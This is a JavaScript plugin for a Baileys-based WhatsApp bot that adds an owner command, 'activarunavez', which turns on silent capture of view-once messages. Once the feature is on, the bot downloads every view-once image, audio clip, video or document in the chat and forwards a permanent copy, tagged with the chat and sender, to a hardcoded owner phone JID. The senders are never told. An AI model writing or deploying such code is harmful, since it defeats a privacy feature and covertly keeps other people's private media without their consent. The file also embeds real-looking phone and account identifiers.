import { downloadContentFromMessage } from '@whiskeysockets/baileys'

const ownerJid = '5493513117202@s.whatsapp.net'
const ownerLids = new Set(['114864672526580'])
const botLids = new Set(['29107664511194'])

const unwrapMessage = (message) => {
  if (!message) return null
  if (message.ephemeralMessage?.message) return unwrapMessage(message.ephemeralMessage.message)
  if (message.viewOnceMessage?.message) return unwrapMessage(message.viewOnceMessage.message)
  if (message.viewOnceMessageV2?.message) return unwrapMessage(message.viewOnceMessageV2.message)
  if (message.viewOnceMessageV2Extension?.message) return unwrapMessage(message.viewOnceMessageV2Extension.message)
  return message
}

const getViewOnceMedia = (message) => {
  const unwrapped = unwrapMessage(message)
  if (!unwrapped) return null

  for (const type of ['imageMessage', 'audioMessage', 'videoMessage', 'documentMessage']) {
    if (unwrapped[type]) return { type, media: unwrapped[type] }
  }
  return null
}

const downloadMedia = async (media, type) => {
  const stream = await downloadContentFromMessage(media, type.replace('Message', ''))
  const chunks = []
  for await (const chunk of stream) chunks.push(chunk)
  return Buffer.concat(chunks)
}

const ownerNumbers = new Set((global.owner || []).map((number) => number.replace(/\D/g, '')))

const isConfiguredOwner = async (conn, m, isROwner, isOwner) => {
  if (isROwner || isOwner) return true
  const candidates = [m.sender, m.key?.participant, m.key?.senderPn, m.key?.remoteJidAlt]
  const candidateNumbers = candidates.map((jid) => String(jid || '').replace(/\D/g, ''))
  if (candidateNumbers.some((number) => ownerNumbers.has(number) || ownerLids.has(number) || botLids.has(number))) return true
  const botJids = [conn.user?.id, conn.user?.jid, conn.user?.lid]
  if (candidates.some((jid) => botJids.includes(jid))) return true
  if (typeof conn.onWhatsApp !== 'function') return false
  const resolved = await conn.onWhatsApp(m.sender).catch(() => [])
  return resolved.some(({ jid }) => ownerNumbers.has(String(jid || '').replace(/\D/g, '')))
}

const handler = async (m, { conn, text, isROwner, isOwner }) => {
  if (!await isConfiguredOwner(conn, m, isROwner, isOwner)) return conn.reply(m.chat, 'Solo el dueño puede usar este comando.', m)

  const value = (text || '').trim().toLowerCase()
  if (!['on', 'off', 'enable', 'disable', 'activar', 'desactivar'].includes(value)) {
    const status = global.db.data.chats[m.chat].captureViewOnce ? 'activado' : 'desactivado'
    return conn.reply(m.chat, `Uso: activarunavez on/off\nEstado actual: ${status}`, m)
  }

  const enabled = ['on', 'enable', 'activar'].includes(value)
  global.db.data.chats[m.chat].captureViewOnce = enabled
  await global.db.write()
  return conn.reply(m.chat, `Captura de mensajes de una sola vez: ${enabled ? 'activada' : 'desactivada'}.`, m)
}

handler.all = async function (m, { conn, chat }) {
  if (!chat?.captureViewOnce || m.fromMe) return
  const media = getViewOnceMedia(m.message)
  if (!media) return

  try {
    const buffer = await downloadMedia(media.media, media.type)
    const caption = `View once capturado\nChat: ${m.isGroup ? m.chat : 'privado'}\nRemitente: ${m.sender}`
    if (media.type === 'imageMessage') {
      await conn.sendMessage(ownerJid, { image: buffer, caption }, { ephemeralExpiration: 0 })
    } else if (media.type === 'audioMessage') {
      await conn.sendMessage(ownerJid, { audio: buffer, mimetype: media.media.mimetype || 'audio/ogg; codecs=opus', ptt: media.media.ptt || false }, { ephemeralExpiration: 0 })
    } else if (media.type === 'videoMessage') {
      await conn.sendMessage(ownerJid, { video: buffer, caption, mimetype: media.media.mimetype || 'video/mp4' }, { ephemeralExpiration: 0 })
    } else {
      await conn.sendMessage(ownerJid, { document: buffer, fileName: media.media.fileName || 'view-once', mimetype: media.media.mimetype || 'application/octet-stream', caption }, { ephemeralExpiration: 0 })
    }
  } catch (error) {
    console.error('activarunavez:', error)
    await conn.sendMessage(ownerJid, { text: `Error capturando view once\nChat: ${m.chat}\nRemitente: ${m.sender}\n${error.stack || error.message}` }).catch(() => {})
  }
}

handler.help = ['activarunavez on/off']
handler.tags = ['owner']
handler.command = ['activarunavez']

export default handler